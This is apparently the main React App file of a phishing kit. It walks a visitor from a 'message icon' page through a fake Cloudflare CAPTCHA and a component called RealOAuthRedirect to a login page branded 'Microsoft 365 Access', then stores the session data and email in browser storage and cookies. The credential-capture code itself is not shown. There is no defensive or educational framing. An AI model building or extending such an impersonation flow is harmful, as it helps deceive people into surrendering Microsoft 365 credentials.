import React, { useState } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';
import LoginPage from './components/LoginPage';

function App() {
  const [currentPage, setCurrentPage] = useState('message-icon');
  const [selectedFileName, setSelectedFileName] = useState('Microsoft 365 Access');

  // Handle the complete flow
  const handleMessageOpen = () => {
    console.log('📧 Message icon clicked - moving to CAPTCHA verification');
    setCurrentPage('captcha');
  };

  const handleCaptchaVerified = () => {
    console.log('✅ CAPTCHA verified - moving to OAuth redirect');
    setCurrentPage('oauth-redirect');
  };

  const handleCaptchaBack = () => {
    console.log('⬅️ Back to message icon from CAPTCHA');
    setCurrentPage('message-icon');
  };

  const handleOAuthSuccess = () => {
    console.log('🔄 OAuth redirect complete - moving to login page');
    setCurrentPage('login');
  };

  const handleLoginSuccess = (sessionData: any) => {
    console.log('🔐 Login successful:', sessionData);
    
    // Store session data and perform cookie work
    localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
    sessionStorage.setItem('current_session', JSON.stringify(sessionData));
    
    // Set cookies for the session
    document.cookie = `ms365_session=${sessionData.sessionId}; path=/; secure; samesite=strict`;
    document.cookie = `ms365_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
    document.cookie = `ms365_auth_time=${Date.now()}; path=/; secure; samesite=strict`;
    
    console.log('🍪 Cookies set, redirecting back to landing page');
    
    // Redirect back to landing page (message icon)
    setTimeout(() => {
      setCurrentPage('message-icon');
    }, 1000);
  };

  const handleLoginError = (error: string) => {
    console.error('❌ Login error:', error);
    // Stay on login page for retry
  };

  const handleLoginBack = () => {
    console.log('⬅️ Back to OAuth from login');
    setCurrentPage('oauth-redirect');
  };

  // Render current page based on flow
  switch (currentPage) {
    case 'message-icon':
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );
    
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
        />
      );
    
    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );
    
    case 'login':
      return (
        <LoginPage
          fileName={selectedFileName}
          onBack={handleLoginBack}
          onLoginSuccess={handleLoginSuccess}
          onLoginError={handleLoginError}
          showBackButton={true}
        />
      );
    
    default:
      return (
        <MessageIconLanding 
          onOpenMessage={handleMessageOpen}
        />
      );
  }
}

export default App;